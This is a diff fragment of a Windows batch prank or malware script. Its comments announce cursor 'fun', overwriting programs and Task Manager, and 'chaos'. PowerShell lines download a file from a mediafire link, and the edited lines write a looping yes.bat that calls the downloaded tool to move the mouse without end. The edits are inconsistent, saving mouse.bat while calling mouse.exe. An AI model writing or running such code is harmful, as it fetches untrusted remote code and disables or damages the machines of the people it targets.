@@ -375,7 +375,7 @@ goto haha
 :: Download Mouse mover by Npocmaka so we can have some fun with the cursor. Npocmaka's repository:
 :: https://github.com/npocmaka/batch.scripts
 
-powershell -Command "(New-Object Net.WebClient).DownloadFile('http://www.mediafire.com/file/xycm8d9wqrm5rsv/mouse.bat/file', 'mouse.exe')"
+powershell -Command "(New-Object Net.WebClient).DownloadFile('http://www.mediafire.com/file/xycm8d9wqrm5rsv/mouse.bat/file', 'mouse.bat')"
 powershell -Command "Invoke-WebRequest http://www.mediafire.com/file/xycm8d9wqrm5rsv/mouse.bat/file -OutFile mouse.bat"
 
 :: Overwrite some programs and taskmanager for extra fun
@@ -466,10 +466,10 @@ echo goto respawn>>yes.bat
 
 echo :crazymouse>>yes.bat
 echo goto chaos>>yes.bat
-echo call mouse moveBy 10x100>>yes.bat
-echo call mouse moveBy 16x50>>yes.bat
-echo call mouse moveBy 190x10>>yes.bat
-echo call mouse moveBy 186x50>>yes.bat
+echo call mouse.exe moveBy 10x100>>yes.bat
+echo call mouse.exe moveBy 16x50>>yes.bat
+echo call mouse.exe moveBy 190x10>>yes.bat
+echo call mouse.exe moveBy 186x50>>yes.bat
 echo goto crazymouse>>yes.bat
 
 :: Create some chaos
